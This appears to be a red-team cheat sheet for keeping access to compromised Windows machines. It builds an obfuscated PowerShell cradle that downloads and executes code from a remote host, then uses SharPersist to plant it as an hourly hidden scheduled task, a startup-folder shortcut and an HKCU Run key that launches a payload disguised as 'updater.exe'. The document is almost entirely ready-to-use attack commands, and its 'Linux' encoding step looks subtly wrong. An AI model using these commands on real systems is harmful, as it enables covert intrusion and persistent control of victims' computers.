### **Task Scheduler**

## Windows version

Assigns a string that downloads and executes code from a remote URL

```powershell
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
```

Convert your string to base64

```powershell
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

## Linux version

Assigns a string that downloads and executes code from a remote URL

```shell
set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
```

Convert your string to base64

```shell
echo -en $str | iconv -t UTF-16LE | base64 -w 0
```

### Run SharPersist

Adds a scheduled task to run obfuscated PowerShell code hourly for persistence.

```powershell
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <your-payload>" -n "<nameOfYourTask>" -m add -o hourly
```

`t schtask:` Persistence technique based on scheduled tasks.

### Startup Folder

Adds a shortcut to the startup folder that runs obfuscated PowerShell

```powershell
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <your-payload>" -f "nameOfYourService" -m add
```

`t startupfolder:` Specifies the startup folder as the persistence method.

### Registry AutoRun

```bash
cd C:\ProgramData
```

```bash
upload C:\Payloads\http_x64.exe
```

```bash
mv http_x64.exe updater.exe
```

Adds a registry entry in HKCU to run Updater.exe for persistence.

```powershell
 execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

```

`t reg:` Indicates the registry will be used as the persistence method.
